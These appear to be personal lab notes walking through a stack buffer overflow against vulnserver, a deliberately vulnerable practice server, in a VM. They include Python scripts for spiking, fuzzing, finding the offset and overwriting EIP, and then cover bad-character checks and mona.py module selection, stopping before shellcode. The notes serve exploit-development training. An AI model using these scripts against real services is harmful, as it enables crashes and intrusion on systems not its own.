# 1. Setup
Downloads: 
1. Win 10 enterprise
2. vulnserver
3. immunity debugger

Install win10 on VM and install tools in it.
Run them as admin

# 2. Buffer overflow explained
![1d10de837890a4b198c36863d531a37b.png](../_resources/1d10de837890a4b198c36863d531a37b.png)
![6eb11c8dd0b176c916024687d7b4ae9e.png](../_resources/6eb11c8dd0b176c916024687d7b4ae9e.png)

- **overflow buffer space**
![2d11170cda68f5b7e443bc4bf6ba501e.png](../_resources/2d11170cda68f5b7e443bc4bf6ba501e.png)

- **steps to conduct buffer overflow**
![f6a5336189b44b7f4eed7043d8147073.png](../_resources/f6a5336189b44b7f4eed7043d8147073.png)

# 3. spiking
![fb2773462fe0a1d3041de842e25790b1.png](../_resources/fb2773462fe0a1d3041de842e25790b1.png)

Tool: `generic_send_tcp`

- Spike file![194a3635cdc8c2eb7a0412612c1082bf.png](../_resources/194a3635cdc8c2eb7a0412612c1082bf.png)
- Created spike file for all commands with py![33afe686cccd91e667f4de2936b30a33.png](../_resources/33afe686cccd91e667f4de2936b30a33.png) 
 ```python3
 #!/usr/bin/python3

cmds = ["STATS", "RTIME", "LTIME", "SRUN", "TRUN", "GMON", "GDOG",\
                "KSTET", "GTER", "HTER", "LTER", "KSTAN"]


for cmd in cmds:
        content = f's_readline();\ns_string("{cmd} ");\ns_string_variable("0");'
        with open(f'{cmd}.spk', 'w+') as w:
                w.write(content)
                print(f'created {cmd}.spk')
```

## Sending spike file with `generic_send_tcp`
![9bc2b62acca5337f14f0fccebf306aa9.png](../_resources/9bc2b62acca5337f14f0fccebf306aa9.png)

Buffer overflow caught as program crashed.
Commands: TRUN, GTER
![ef4dee9ec042c42c2c304588980b3f3e.png](../_resources/ef4dee9ec042c42c2c304588980b3f3e.png)

![df9a5ddfb3bbccf5322ade6276b1fd1f.png](../_resources/df9a5ddfb3bbccf5322ade6276b1fd1f.png)

Payload format: `<cmd> /.:/<Chars>`
![b0f407a5ae3a2df93c318338aed6990b.png](../_resources/b0f407a5ae3a2df93c318338aed6990b.png)

# 4. Fuzzing with python
Script:
```python3
#!/usr/bin/python3


import sys, socket, time


target = input("Enter target ip: ")
port = int(input("Enter port: "))
cmd = input("Enter command: ")

buffer = "A" * 100

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))

                #sending payload for buffer overflow
                s.send((f"{cmd} /.:/{buffer}".encode()))
                print(f"Sent {len(buffer)} A's")
                s.close()

                time.sleep(1)
                buffer += "A" * 100

        except:
                print(f"Fuzzing crashed at {len(buffer)} bytes")
                sys.exit()
```

# 5. Finding the OFFSET

Script:
```python3
#!/usr/bin/python3


import sys, socket, time


target = input("Enter target ip: ")
port = int(input("Enter port: "))
cmd = input("Enter command: ")

offset = input("Enter offset: ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

#sending payload for buffer overflow
s.send((f"{cmd} /.:/{offset}".encode()))
s.close()
```

Generating char pattern from metasploit-framework of 200 bytes (for GTER) as it crashed in 200 and **sending** it to check for crash.

![2becaff3e56ea295252e8b617b3dc949.png](../_resources/2becaff3e56ea295252e8b617b3dc949.png)

![e058bcb2f96e654fefa71aae4f0f07c7.png](../_resources/e058bcb2f96e654fefa71aae4f0f07c7.png)

- GOT **EIP: 41396541**

## Now using pattern_offset.rb to get offset
![cc03f8816775bc415d9efe1e325c0463.png](../_resources/cc03f8816775bc415d9efe1e325c0463.png)

Got offset as 147.
Now sending exactly 147 A's to verify it.
![0bd2c67039b716203768d1fec7c6018a.png](../_resources/0bd2c67039b716203768d1fec7c6018a.png)
**AND IT CRASHED!**
![576cabcccf2ebb3c693e94749c77bdba.png](../_resources/576cabcccf2ebb3c693e94749c77bdba.png)

# 6. Overwriting EIP 
Script:
```python3
#!/usr/bin/python3


import sys, socket, time


target = input("Enter target ip: ")
port = int(input("Enter port: "))
cmd = input("Enter command: ")

shellcode = "A" * 147 + "B" * 4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

#sending payload for buffer overflow
s.send((f"{cmd} /.:/{shellcode}".encode()))
s.close()
```
![e71e0d4ad0930349784e004e69d66b6f.png](../_resources/e71e0d4ad0930349784e004e69d66b6f.png)

**EIP: 42424242**

# 7. Finding bad characters
Tool: https://github.com/cytopia/badchars

![8c106b3463b5ae3d02409032ae9ae17e.png](../_resources/8c106b3463b5ae3d02409032ae9ae17e.png)
Bad chars are the first missing one's in consecutive.

# 8. Find right module
Looking for dlls, etc which have no memory protection.

Tool: https://www.github.com/corelan/mona
**PASTE mona.py in immunity pyCommands**
![8bfad7623115f6b8eabd7b026e4eff1a.png](../_resources/8bfad7623115f6b8eabd7b026e4eff1a.png)